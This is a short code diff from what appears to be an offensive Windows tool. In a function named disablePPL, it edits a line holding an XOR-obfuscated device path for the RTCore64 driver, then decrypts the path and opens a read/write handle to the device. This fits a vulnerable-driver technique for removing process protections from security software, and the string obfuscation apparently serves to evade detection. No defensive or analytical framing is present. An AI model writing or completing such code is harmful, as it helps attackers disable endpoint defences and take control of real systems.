@@ -91,7 +91,7 @@ void disablePPL() {
     }
 
     // \\.\RTCore64
-    const unsigned char dev_enc[] = { 0x6C, 0x6D, 0x1C, 0x6F, 0x66, 0x61, 0x75, 0x58, 0x4A, 0x5C, 0x57, 0x56 }; // example XORed
+    const unsigned char dev_enc[] = { 0x6C, 0x6D, 0x1C, 0x6F, 0x66, 0x61, 0x75, 0x58, 0x4A, 0x5C, 0x57, 0x56 };
     char* dev_path = xor_decrypt_string(dev_enc, sizeof(dev_enc), XOR_KEY, key_len);
 
     HANDLE Device = CreateFileA(dev_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
